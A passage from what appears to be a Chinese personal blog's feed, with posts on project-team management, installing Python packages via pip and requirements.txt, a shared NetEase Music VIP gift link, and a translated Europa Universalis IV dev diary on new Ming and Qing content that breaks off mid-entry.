title="管理制度"></a>管理制度</h3><p>在这里，只提一下在我工作中遇到的一些比较不好处理的问题：</p><ol><li>压力下传比较吃力：我觉得软件开发有一个特点，就是需要有一定的压力才能把东西做好。有些技术难题，可能加一把力，加两次班就可以搞出来；文档和代码的质量，只要再细心一点就会比较完美。如果没有压力，好多问题就可能被忽略掉或遗留下来；而压力过大会影响情绪，打消工作的积极性。我们所面临的问题主要是压力传达不下去，尤其到项目快结束的关键时期，有一种力不从心的感觉。</li><li>对于工作积极性不高或绩效不是很好的成员，缺乏有效的刺激手段；对工作积极性高或工作绩效比较好的成员，又缺乏一种有效的激励手段。</li><li>工作中如果意见不一致，如何协调也是一个问题。我想是否可以建立一种工作制度，就是一个人可以保留自己的意见，但要和大家的步调一致。</li></ol><p>目前我所能做的只是：带头工作，为大家做一个榜样；在团队中建立良好的个人关系；不断地做思想工作，用自己的观点去影响别人。我感到这样做对责任心强的人效果比较好，而对责任心不强的人或个性比较强的人就没什么效果。至于建立一些管理制度效果是否会好，我也说不清楚，只是一些想法而已。因为我觉得“过于繁琐和严密”的制度象是一把双刃剑，可能短期取得了想要的效果，但从长期考虑却破坏了项目组的合作、团结氛围，降低工作效率。</p><h3 id="团队建设"><a href="#团队建设" class="headerlink" title="团队建设"></a>团队建设</h3><p>如果说技术问题对于一个项目负责人来说是首要任务的话，那么团队的建设就是第二个重要的工作内容。我觉得团结、积极向上的团队氛围对一个团队来说是非常珍贵的。不同性格的同事在一起，难免会产生一些磕磕绊绊。往往是工作中的一句不满、牢骚、批评或指责，说者无心听者有意，也许就影响了其他人的工作情绪。所以在一个团队中需要有人去弥合，去消除这些消极的东西。尤其在这种项目中，大家的立场不同，水平不同，这种影响就更多一些，更不好处理一些。总之，对于一个团队来说，技术难题并不可怕，可怕的是团队人心涣散、各自为政，没有积极性，没有责任感。</p><h2 id="对于其他问题的想法"><a href="#对于其他问题的想法" class="headerlink" title="对于其他问题的想法"></a>对于其他问题的想法</h2><p>下面是一些零碎的想法，自己觉得有用，先记下来：</p><ol><li>项目负责人的首要任务是保证整个项目的保质保量完成，所以在工作分配时上应该留出足够的时间去发现和解决开发过程中存在的一些问题，关注一些有风险的技术点，协调资源，解决与客户方出现的一些问题。</li><li>技术方面，需要对项目有一个整体把握，关注有风险的问题；对于大的项目，迅速培养技术骨干，这样对项目比较有保障，同时也为个人提供了充分展现自己的机会；合理分配资源，发挥每个人的长处，关注其短处；及时根据实际情况制定出详细的工作计划，合理分配工作量；多想一些将要发生什么问题，提早采取预防措施；少一些成见，善于接受新事物。</li><li>与客户方合作需要注意的一些问题：（1）在这种委托开发项目中，从根本上受委托方是处于劣势的，但在具体问题上，不能对方“错的对的”我们都接受，防止到最后承担不必要的责任；（2） 营造坦诚、互信、互相理解的合作氛围，站在解决问题的立场上商量问题大家都比较容易接受，如果是盯着合同、规定、责任去做，事情就难办了；（3） 多看到对方好的东西，对于对方的不足，主动用我们的思想去影响对方，毕竟大家在做同一个事情，事情做砸了对大家都不好；（4）注意保护自己，比如在接受项目时，在开发范围调整时，要充分考虑到困难，如果不能按时完成，应该及时反馈，沟通解决。</li></ol><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>现在看这个总结，还能回忆起当时自己的一些困惑。但是它毕竟是一个开端，每个人都有一个成长的过程嘛，对也罢错也罢，成也罢败也罢，都已经是自己的一部分了。</p><blockquote><p>原文链接：<a href="https://zhuanlan.zhihu.com/p/409738695">https://zhuanlan.zhihu.com/p/409738695</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目管理 </tag>
            
            <tag> 产品开发 </tag>
            
            <tag> 开发流程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python批量安装模块</title>
      <link href="/375.html"/>
      <url>/375.html</url>
      
        <content type="html"><![CDATA[<h2 id="创建requirements-txt文件，把所需要安装的模块都写进去"><a href="#创建requirements-txt文件，把所需要安装的模块都写进去" class="headerlink" title="创建requirements.txt文件，把所需要安装的模块都写进去"></a>创建requirements.txt文件，把所需要安装的模块都写进去</h2><p><img src="https://cos.gjcloak.xyz/upload/2023/02/3009665137.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>当然，版本号可以为空，为空时自动最新版本</p><h2 id="执行命令安装requirements-txt中的模块"><a href="#执行命令安装requirements-txt中的模块" class="headerlink" title="执行命令安装requirements.txt中的模块"></a>执行命令安装requirements.txt中的模块</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt </span><br></pre></td></tr></table></figure><p>等待系统自动下载安装，简单快速</p><h2 id="已安装模块的导出"><a href="#已安装模块的导出" class="headerlink" title="已安装模块的导出"></a>已安装模块的导出</h2><p>如果已经安装大量模块，按前面方法手写肯定很麻烦的，那有没有简单的方法呢？</p><p>还真有执行下面的命令即可完成已安装模块的导出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 freeze &gt;requirements.txt</span><br></pre></td></tr></table></figure><p>生成已安装的模块<code>requirements.txt</code>，是不是很简单</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分享网易云黑胶会员礼品卡(已更新3月份，需要的自领)</title>
      <link href="/5a1a3cd4.html"/>
      <url>/5a1a3cd4.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/upload/2023/02/4285372390.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>昨天晚上在听歌的时候突然想起来我是黑胶会员，有个7天的黑胶VIP礼品卡，感觉虽然自己用不上，但也不能浪费，想分享给有缘人，觉得每月13号来分享这个福利，虽然时间不长，但能白嫖的话谁会讨厌呢</p><blockquote><p>网易云领取有两个硬性条件<br>1、礼品卡仅限非黑胶VIP用户领取，每人每月只能领取一次<br>2、领取有效期是：2023年2月1日00:00 - 2023年3月3日23:59</p></blockquote><p>如果你满足以上条件那就可以领取，领取方式请点击下方链接即可（如果评论后没有显示，请重新刷新即可）</p><p>[hidecontent type&#x3D;”reply” desc&#x3D;”隐藏内容：评论后查看”]</p><p><a href="https://music.163.com/prime/m/gift-receive?p=ZQUAw0PpPNdjXzyM-e5M4iYgCtBJJpwEyDUzGm3Q-yy8GSmnkudLwUYdhE4CMRGrNtYbta4bmbPPX-upwIzQw62J8xkZ6VT8gJrQ6T51OIQ&d=W-7UFa1E44odM6jEt-DA0A">https://music.163.com/prime/m/gift-receive?p=ZQUAw0PpPNdjXzyM-e5M4iYgCtBJJpwEyDUzGm3Q-yy8GSmnkudLwUYdhE4CMRGrNtYbta4bmbPPX-upwIzQw62J8xkZ6VT8gJrQ6T51OIQ&amp;d=W-7UFa1E44odM6jEt-DA0A</a></p><p>会员权益介绍：</p><ul><li>会员曲库：畅听千万会员曲库歌曲；</li><li>无损音质：CD级纤毫毕现的无损音质；</li><li>免费下载：畅享付费歌曲下载特权，没有网络也能听；</li><li>音画主题：用更酷的方式看见音乐，让律动跟随节奏，共赴看得见的听觉盛宴；</li><li>头像挂件：设置专属头像挂件，彰显你的个性；</li><li>票务特权：畅享免费演出票福利，更有优惠券等你来拿；</li><li>个性皮肤：畅享爆款皮肤，定制你的个性皮肤。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网易云音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>欧陆风云4开发日志  1/17 中华天子</title>
      <link href="/905ba154.html"/>
      <url>/905ba154.html</url>
      
        <content type="html"><![CDATA[<p><strong>牧游社 牧有汉化翻译</strong></p><p><strong>Europa Universalis IV - Development Diary 17th of January 2023 - Emperor of China</strong></p><p><em><strong>PDX Big Boss, Sergeant</strong></em></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e29ff092bf86233dfab581fae17ef806.jpeg"></p><p>Hey everyone, happy new year and I hope 2023 grants you health, growth and lots of love. Let’s take a look at the new content we have prepared for China! We started thinking about this one year ago, while working on the 1.33 update, but now the time has come for it!</p><p>大家好，新年快乐！我祝愿大家2023健康长寿、财源滚滚、喜乐双至！来一起看看我们为中国准备的新内容吧！我们一年前在进行1.33版本号更新开发的时候，就开始构思这些内容，不过现在才终于有机会为大家做好！</p><p>Before we begin, the content you will see here is by no means finalized, as always your feedback is greatly appreciated and cherished!</p><p>在我们开始之前要强调的是，你们看到的内容都并不是最终内容，我们一如既往地会很高兴看到你们的反馈！谢谢！</p><p>Playing Europa Universalis is all about building up your nation, growing and expanding your borders. It’s all about the struggles and the thrills of each conquest, fighting at the edge of bankruptcy or measuring your moves carefully. However, Ming does not really suffer from these issues at the hands of a player due to the fact that it starts as the nation with the highest development and strongest economy in 1444 and until 1.35 it was regarded as a fairly relaxing experience for most players. Surely there are some minor obstacles early on, but in general the playthrough was not at all challenging and thus many players steered away from playing the Great Ming, despite it having a not-insubstantial amount of flavor in the form of events, factions and later the Mandate of Heaven mechanic, the latter of which ended up being a bit of a pain to manage. All this unrealized potential is what we seek to tackle by giving the Ming, its offshoot Chinese Warlords as well as the Jurchen tribes and the Qing lots of new missions, events and more!</p><p>游玩欧陆风云，从来都是要建设你的国家、发展壮大、扩张你的边界，永远都充满了冲突与征服带来的刺激，一直都在破产的边缘疯狂试探或者小心前行。然而，玩家手中的大明却不需要真正面对这些问题，因为大明在1444年是发展度最高而且经济最好的国家。在1.35版本号之前，游玩大明对大部分玩家而言都是很放松的体验。诚然，大明的前期会有一些小小的困难，但是游玩流程总体来说并不会全程充满挑战，所以很多玩家后面就不玩它了，哪怕大明有不少的特殊事件、派系以及之后的天命机制（天命经常玩起来有一点点麻烦）。这些潜力都被浪费了，而我们希望通过给大明、割据诸侯、女真诸部和大清添加一堆新任务、事件和其他内容，来使这些潜力发挥出来！</p><p>The Ming will see many new additions, mechanics and cool-stuff-in-general with 1.35:</p><p>大明将会在1.35版本号获得一堆新额外内容、机制和好康的：</p><blockquote><p>A brand new, fully-fleshed out mission tree 全新的大明任务树 Accompanied by a new Estate - the Eunuchs 还有新的阶层——宦官 New tough challenges as you struggle to curb the influence of the Eunuchs and prevent your (historical) collapse 新的困难挑战，让你要用尽手段斗倒宦官并防止大明（和历史上一样）崩溃 Over a dozen new Reforms that interact with and are complemented by various missions (yes we tweaked the gain and loss of Mandate) 十来个与各种任务相辅相成的新改革（是的我们把天命增减的方式改变了） New Decrees that interact with and are complemented by various missions 与各种任务相辅相成的新诏书 New Flavor events integrated in the mission tree - as well as independent from it 与任务树浑然一体的新风味事件——还有独立于任务树的新事件 Deep modability and new functions added to the Mandate mechanic 在天命机制中加入更大的模组自由度与新的功能 A new great project that spans several provinces 一个涉及很多省份的新的伟大工程（奇观）</p></blockquote><p>So let’s take a look at the tree!</p><p>那我们就看看任务树吧！</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-16956a89e450d50b5bd789333e019a0c.png"></p><p>The Ming historically were rulers of unprecedented magnanimity, wealth and the ambition to match their huge domain. However, in 1444 the starting ruler sadly fell short to live up to his predecessor’s abilities, represented in the game as a 1&#x2F;1&#x2F;1. The Great Ming Empire lies stretched and continuously tormented by hordes in the North and West, waning influence with its tributaries in the South and no say in the affairs of Japan. During the game, you may also suffer from floods and earthquakes which historically kickstarted (and ended) the Ming Dynasty and will rapidly corrode the growth of the Mandate. Their impact can be alleviated by constructing certain buildings and completing a couple relevant missions.</p><p>曾几何时，大明天子器宇轩昂、富甲天下，宏图大志配当其无垠疆土。然而在1444年，开局的统治者不如父辈远甚，观之不似人主，在游戏里就是个三棍神君。大明绵延的疆域不断地被北方和西方的游牧部落袭扰，其对南面朝贡国的影响也日薄西山，对日本的事务也无法插手。在游戏中，你会遭受洪涝地震灾害，它们在历史上成就了大明（最后也亡了大明），还会经常打断天命增长。建造有关建筑并完成几个相关任务就可以降低不利影响。</p><p>The starting situation of the Great Ming is represented and explained in a start-up event:</p><p>大明开局的态势将在一个开局事件中展示体现：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ac6eb2872e873422ddcad9e8787010dd.png"></p><blockquote><p><strong>大明时局</strong> 大明开国已近百年，前朝疆土尽数为我朝囊括。征战成果之丰硕，国库日渐充盈，万民因此兴乐。然而千里长堤之上已筑有蚁穴：朝命阻塞于十三省内、北方瓦剌将成肘腋之患，而当朝圣上更是昏聩无能，实乃当下时局之危。圣朝必改革朝政、受命于天，方可令国祚永延。 - 天命无常，惟德是与…… 省份的自治度将会高涨，直至通过任务、事件或决议将其降低。 Note; missions, art and descriptions are not final! 注意：任务、美工与描述并非最终成品！</p></blockquote><p>Autonomy in the provinces of the Empire will increase, at a minimum of +25%. This autonomy will persist and you will have the ability to reduce and eventually eradicate it, as you reign in the various external and internal elements that threaten the Empire. This will not be an easy task.</p><p>天朝境内各省的自治度将会提高，最低也会提高25%。自治度将会居高不下，而你可以通过攘除内忧外患的方式将自治度降低并最终彻底消除。这当然不是易事。</p><p>The second obstacle, and arguably the one that gave my colleagues the biggest pain to deal with, is the Eunuchs Estate. A powerful body of advisors near the Emperor who will gain and lose power depending on the state of internal affairs as well as the abilities of the Emperor himself.</p><p>大明朝第二个心腹大患是宦官阶层。这个问题是我同事们处理起来最头大的。这一伙天子近臣的权势消长取决于内政状态与皇帝本身的才干。</p><p>Eunuchs will offer a vast array of very powerful Estate privileges, most of which will scale with their internal power in the form of crown land controlled as shown below:</p><p>宦官会有一系列强力的阶级特权。其中大部分特权会按照控制王室领土的形式对应表现其阶层权力，正如下图所示：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-6d2984d74be07e924562282af45d6cd4.png"></p><blockquote><p><strong>协调属国外交</strong> 宦官忠诚平衡：10% 宦官影响力：10% 最大专制度：-15 59%的土地控制带来： 提升关系：+29.5% 年度腐败值：+0.19 属国独立倾向-14.77% 撤销这项特权： 若想撤销此特权，此阶级的忠诚度必须高于其影响力 忠诚度会改变：-20 ————— 纳贡的属国与天子之间的外交将从此会由宦官们执掌御印，全权掌控。</p></blockquote><p>Note; Yes, they will start with nearly 60% crown land while you will start with only 15% to better represent the grip of power between the starting ruler of the Ming and his Eunuchs.</p><p>注意：是的，宦官们会在开局时候就掌控将近60%的王室领地，而你只有15%。这么设计是为了更好展现大明的天子和他的宦官间的权力分配。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-a1ae84b3c926ccd22ad543b4d4a513dd.png"></p><blockquote><p><strong>枢密院</strong> <strong>帝国议会</strong> 修正： 可用顾问+2 59%的土地掌控带来： 年度腐败+0.06 效果：在颁布后无效果 <strong>宦官土地权利</strong> 修正： 免除收回土地影响 最小自治度-10.00 行政容量+100 59%土地掌控带来：… 效果：在颁布后无效果 <strong>宫廷阴谋的守护者</strong> 59%土地掌控带来： 外交声誉+1.77 年度腐败+0.19 叛军镇压效率+59.1% 效果：在颁布后无效果 Note; Icons are a work in progress! 请注意：图标还在设计中</p></blockquote><p>You won’t be able to reform your country anywhere near as fast if you do it by crushing the influence of the Eunuchs, BUT if you do lean on them too much, the accumulated cost of fighting their inevitable corruption will become overbearing, difficult to manage and you will collapse. It is up to the player to strike the perfect balance between manipulating this double-edged sword.</p><p>如果你以镇压宦官的方式来进行改革，那么你的国家就无法实现快速变革，但如果你过于依赖宦官们，对抗他们不可避免的腐败而累积的成本将会变得难以承受和难以控制，并导致国家崩溃。如何达成完美的平衡，操控好这把双刃剑，将取决于玩家的操作。</p><p>Moreover, I took the liberty to give this new Estate a unique disaster, unlike other Estates’ similar predicaments. This one will hurt a lot more and its solution is considerably harsher than other Estate Disasters. When other Estate Disasters require you to lower influence and enact a national decision in order to end the disaster, the Eunuch disaster will have its decision fundamentally altered. Much like other estates, it will end when the reigning estate’s influence falls low enough. However, every time you enact the national decision available during the disaster, Eunuchs will:</p><p>此外，我还给这个新的阶层设计了专属的灾难，与其它阶层的类似灾难不同，这个新的灾难很有破坏性，其解决办法也比其它阶层的灾难严苛很多。平息其它阶层的灾难只需要你降低该阶层的影响力，并颁布一项决议以平息灾难，但平息宦官灾难的决议会从根本上改变你的国家。正如其它阶层灾难那样，灾难会在当前统治阶层的影响足够低的时候平息。但是，每当你在灾难中颁布一项可用决策时，宦官阶层会：</p><blockquote><p>Lose 1 random privilege so as to lower their influence 随机失去一项阶级特权以降低他们的影响力 Spawn a special large stack of rebels, every province this stack of rebels sieges will lower your mandate considerably 生成一大坨特殊叛军，而且这坨叛军攻下的每个省份都会让你失去大量天命 Cost you stability (which is required to enact this decision) 让你掉稳定度（执行这项决议的消耗）</p></blockquote><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-2d35f54898f2600212051cc1644d21cd.png"></p><blockquote><p><strong>抑制宦官：</strong> 失去3点稳定度 杰出的宫廷官僚会被从宦官阶层移除，并带来以下效果： 16个异教叛军团体会在贵阳起义 每个被这些叛军攻占的省份都会让我们失去10点天命</p></blockquote><p>This loop continues until the estate’s influence is either low enough or they have no privileges, so you best steer clear from the disaster!</p><p>这个决议循环会一直持续到要么宦官影响力足够低，或他们失去所有特权，所以你最好别让这灾难发生！</p><p>You will also be able to interact with the estate via missions and events, unlock new privileges (that do not cost yearly corruption) etc.</p><p>你同样可以通过任务和事件来和阶层互动，解锁新的特权（不会给你带来年度腐败度debuff的那种）等等。</p><p>Before we move on, be aware that the AI is instructed as to how it will utilize and play around with the Yearly Corruption but Ming still explodes relatively frequently as it used to!</p><p>在我们进行到下一个部分前，请留意，AI被我们调教得更好了，知道如何利用和控制年度腐败度，但大明还是会和以前一样频繁自爆！</p><p>Let’s take a look at some of the new missions, their requirements and more importantly, their rewards!</p><p>让我们来看看一些新任务、任务要求，还有更重要的，它们的奖励！</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-752072cf67e4c860c2ae3b5d5ae89646.png"></p><blockquote><p><strong>大明一十三省</strong> 对大越的立场倾向外交时完成这个任务，便会获得以下奖励： 大越： 王室获得10%阶层土地 大越获得“天子支持”，持续25年，并带来以下效果： 威望衰减-1% 顾问花费-15% 所有阶层影响修正-10% 掌控军队将会被从贵族移除，有以下效果： 将大明设置为历史友邦 大明将大越设置为历史友邦 获得100点外交点数 或者，如果我们选择征服越南国土，其本地文化将被汉化，我们也会收到以下奖励： 在红河地区失去10年的分离主义</p></blockquote><p>The idea behind Ming, given that it starts at the size it does, is that every single external mission (without exceptions) will offer a diplomatic path &#x2F; solution. You are already plenty big and if you don’t want to conquer directly (or even indirectly in most cases) you will not be forced to do so!</p><p>考虑到大明开局时的体量，我们重做大明的理念是：每一个涉及外国的任务（没有例外）都会指明一条外交途径&#x2F;提供一个外交解决方案。既然你已经很巨大了，如果你不想直接征服外国（在大多数情况下，你甚至都不想间接征服他国），那你也不会被任务逼着去开疆扩土。</p><p>Something I wanted to implement based on feedback from 1.34 is this new “Event Insight”, a small summary of what the event is about and what its reward alludes to so as to give you some info before clicking it.</p><p>基于从1.34版本号得来的反馈，我想往游戏里加入一些新东西：“事件概览”，一个简短的事件简介，给你简单介绍这个事件的内容，以及其奖励的暗示，以让你在乱点一通之前给你一点基础信息。</p><p>Before we move away from this mission tree, I should note that the second half of it, while largely inspired and based on the labors of Ming Emperors, is available to any Chinese Warlord who takes up the Mandate of Heaven, more details on that further down.</p><p>在我们介绍任务树前，我需要说明的是，任务树的下半部分虽然是基于历史上朱家皇帝的所作所为设计出来的，但任何宣称了天命的诸侯都可以使用这部分任务。详细细节会在后面给大家介绍。</p><p>As mentioned earlier, 1.35 will introduce vast changes to the Mandate, so let’s tackle some of the biggest ones here:</p><p>正如前文介绍，1.35版本号会引入天命系统的大改，所以我们来介绍下最重要的几个：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-5a436f75a4041cead7cf41907d18f38e.png"></p><blockquote><p>（WIP）天朝改革：改土归流、改革海禁、设置中都、设立理蕃院、重塑官僚 圣旨： 扩大宫廷官僚 实施人口普查 提拔海军军官 缩进关税控制 增强国防能力 训练军官团队 资助教育中心 宣布朝代国号</p></blockquote><p>The Mandate now houses over 10 new Reforms inspired and heavily based upon actual reforms between the 15th and 19th century that the game covers.</p><p>天命界面现在会显示超过十个新的天命改革，由游戏涵盖的15-19世纪历史上中华帝国的真实改革启发而来。</p><blockquote><p>Most of the new reforms can be completed at random order 大部分天命改革可以以任意顺序完成 Some are unlocked via the mission tree (that is common with the Chinese Warlords) 一些改革可以通过任务树解锁（同样适用于其他诸侯） 2 of them are mutually exclusive with each other 其中两项改革互斥 Some may require a certain number of reforms passed (yay modability!) 一些改革会要求事先完成一定数量的改革（耶！mod大师们快来魔改！） Some require the country to move in a certain direction ( idea groups having been picked with alternative requirement, certain missions completed etc ) 一些改革会要求国家正按照某个方向发展（比如已经选择了的理念组或者其他要求作为替代，完成特定的任务等。） (Nearly) Every reform now impacts both the Emperor and their subjects, both tributaries and non-tributaries. （几乎）每一个改革都会影响天子和属国，包括朝贡国和非朝贡属国。 To account for the heightened number of reforms (and decrees) we increased the rate of Mandate growth and decay 为了更好发挥更多数量的改革和诏书的作用，我们提升了天命增长和衰减的速度。</p></blockquote><p>We wanted to explore interesting rewards with the Mandate so we took the liberty and added new and interesting bonuses to some of the reforms, such as the ability to grant New Coordinator Offices, which work much like Holy Orders: The Buzhengshi, Anchasi and Du Si:</p><p>我们想为天命系统增加更有趣的反馈，因此我们自作主张给一些天命改革增加了一些有有趣加成，比如增设一个类似修道会的新行政机构：布政司、按察司、都司。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-593a9652fcf8a24e6935741861db8b37.png"></p><blockquote><p>(WIP)本地税收修正：+20.0% 省份行政容量修正：-10.0% 本地叛乱度：-1.00 本地生产效率：+10.0% 本地招募时间：-20.0% 友军移动速度：+10.0%</p></blockquote><p>Moving on, new Decrees were also added as we can see in the picture above. Some of my favorites:</p><p>咱们接着说，我们还增设了新的诏书，大家可以在下图中看到，其中有些我非常喜欢：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-01575e2c81ad782ece1aff4af4807159.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-125d2c5fd5e3afe8b12dbf376a09581f.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-77385fa38db2e2d0acef45898968dc63.png"></p><p>As with reforms, I wanted decrees to play an integral part in the gameplay around missions and events. So, decrees:</p><p>正如天命改革一样，我希望诏书也能在游戏中围绕任务和事件发挥自己的效果，所以它需要：</p><blockquote><p>May now be required to be active by some missions 一些任务可能要求某些诏令被激活 Will have their bonuses altered or increased by some missions 会被任务改变效果或增加奖励 May themselves be requirements for certain reforms and vice versa 成为特定天命改革的前置条件，或正相反</p></blockquote><p>All these new additions are fully scripted and we very much look forward to seeing what you come up with!</p><p>所有这些新增内容都是完全可以通过脚本编写的，我们非常期待看到你们能鼓捣出什么！</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-6475c877fa67e23d43a3737deebbbce0.png"></p><p>As I mentioned before, the Chinese Warlords, Jurchen tribes, Manchu and Qing will receive new content.</p><p>正如我之前提到的，割据诸侯、女真部族、建州和大清会获得新内容。</p><p>The various new Chinese trees for Qing-related tags are split into 3 branches</p><p>与大清有关tag的新任务树会有三个分支：</p><blockquote><p>The unique content of a nation which varies between Ming- Qing&#x2F;Jurchen&#x2F;Manchu-Chinese Warlords 专属内容，大明、大清&#x2F;女真&#x2F;建州、割据诸侯之间存在不同 The Emperor of China branch which deals with internal matters and administrating China 天朝皇帝分支，处理国际事务与管理中央王国 A third branch unique to the Qing only 第三个分支是清专属分支</p></blockquote><p>The Chinese Warlords, meaning the releasables of Ming will also have their own little mission tree which will help them unite the Chinese lands and take up the Mandate of Heaven, which will then unlock the ‘Emperor of China mid-section of their tree (the bottom second part of the Ming tree):</p><p>割据诸侯，也就是那些大明可以释放国家，也有他们自己的小型任务树，可以帮助他们一统中国并夺取天命，之后就可以解锁中线-皇帝线、以及自己的任务树（大明下半部分的任务树）。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-5334f0f355a28adde3aa075e2120cdac.png"></p><p>The missions are partially dynamic in terms of their requirements&#x2F;rewards based on your capital’s location</p><p>任务的需求和奖励可能会根据你首都的位置动态变化。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-15e6b5766ef644a082d1dca1a18e6719.png"></p><blockquote><p><strong>稳定的宫廷</strong> 大越获得“贤能宫廷”，持续25年，给予如下效果： 发展成本：-10.0% 顾问花费：-20.0%</p></blockquote><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e57ff79a1e8877ec326054ec9d54fed0.png"></p><blockquote><p><strong>大明的陨落</strong> 获得10000人力 获得75陆军传统的将领 如果你在独立战争中有至少25%战争分数时完成这个任务：获得1级军事科技 否则：各获得150点行政点数、外交点数、军事点数</p></blockquote><p>The Jurchen &#x2F; Manchu will have access to newly redesigned missions that will follow the historical path of the Jianzhou but will be available to all regional tribes:</p><p>女真和建州都会获得一套重新设计的任务树，遵循建州女真的史实路线，但所有地区内的女真部落都可用：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ac0106f38482650cfd0e8ebdd1831f1f.png"></p><p>From subjugating neighbouring hordes, to knocking on the gates of the Great Ming by publishing the Seven Grievances. Along the way, powerful flavored bonuses, new cool rewards and historical immersion amount to a fun playthrough:</p><p>征服邻近的部落，发布七大恨，叩开通向大明的大门。一路获得强有力的风味加成和有趣的新奖励，以及游玩途中的历史沉浸感。</p><p>Every choice will have a different impact at the ‘Reforms of Nurhaci’ event later in the game! Nurhaci’s stats are random but heavily weighted to be really really good across the board. As a general he will serve as a 3&#x2F;6&#x2F;5&#x2F;3 with a special new unique General trait inspired by his real life title of ‘Dragon-Tiger’ granting +10% Movement Speed and +10% Cav Combat Ability (more about new traits in a future DD). Lastly, as an advisor, he’s a level 3 Discipline Advisor at -90% of the cost and will also offer a flat 100 Mil Power.</p><p>游戏后期的“努尔哈赤改革”事件的每一个选项都将会5有不同的效果！努尔哈赤的属性是随机的，但是很大概率面板属性是非常好的。如果作为将领，他将是3&#x2F;6&#x2F;5&#x2F;3的神将，并且有独特将领特质“龙虎将军”——这也是他真实的封号，给予10%移动速度和10%骑兵战斗力加成（之后的开发日志会带来更多独特特质）。最后，作为顾问，他将是3级训练家顾问，并且有着90%顾问花费减免，同时直接给予玩家100军事点数。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-39f6062b1a7703f1b24866384ad98353.png"></p><blockquote><p><strong>七大恨</strong> 历史上，这一宣言由满洲统领努尔哈赤在天命三年农历四月十三发布。满洲部落和明王朝间的恨意达到顶峰，导致了这两个政权间的全面战争。七大恨包括： 明无故杀害努尔哈赤祖父觉昌安和父亲塔克世 明偏袒叶赫、哈达等部女真，欺压建州女真 明违反双方划定的范围，强令努尔哈赤抵偿其所杀的越境人命 明在建州与叶赫的部族争战中出兵帮助叶赫。 明支持叶赫将已许给努尔哈赤的女儿转嫁蒙古喀尔喀部，致使建州蒙羞 明驱逐居住在边境，已开垦土地上的建州百姓，毁坏其房屋田地 明派萧伯芝赴建州，作威作福 – 建州获得“发布七大恨”，持续到爱新觉罗·努尔哈赤死亡，给予以下效果： 攻城能力：+20.0% 全局进攻骰点数加成：+1.00</p></blockquote><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-fdb1700be475c38926f6f5637720ce1a.png"></p><blockquote><p><strong>成立后金</strong> 国家名称将转变为后金 获得25威望 所有溢出的威望会转化为君主点数 触发“努尔哈赤”改革事件 事件概览： 此事件会让我们开明的君主改革的官僚体制和军队，从而集中管理内部事务 获得100军事点数</p></blockquote><p>Upon taking the Mandate of Heaven you will unlock the Emperor of China part of your mission tree which is common between all of the tags (Ming, releasables etc) upon taking up the Mandate.</p><p>通过夺取天命，你可以解锁中国皇帝任务线，包括大明可释放的国家在内的所有诸侯都可以夺取天命并解锁任务。</p><p>Forming Qing will offer brand new and freshly reworked missions. The first branch will be inherited by your tribal days. The second branch is the common ‘Emperor of China’ part and finally the third branch contains missions exclusively available to Qing:</p><p>成立大清会给予一套全新并且重做了的任务树。第一个分支是继承部落传统，第二个分支是“中国皇帝”线，最后第三个分支是大清专属任务线：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-3ffeb2f36bb5657d56d8e7b14dae2a05.png"></p><p>Many of these missions will feature very interesting rewards as shown below:</p><p>其中许多任务奖励都非常有趣，罗列在下方：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-73228f0071d523b3b1342829ae15bff0.png"></p><blockquote><p><strong>军机处</strong> 启用“军机处”第6级政府改革。 给予如下效果 改革修正： 年度贤能值：+0.25 行政容量修正：+10.0% 所有阶级忠诚平衡点：+10.0% 获得100行政点数</p></blockquote><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-10b8ce4b3ef143e4784794ef3a0fcd5d.png"></p><blockquote><p><strong>现代化八旗</strong> 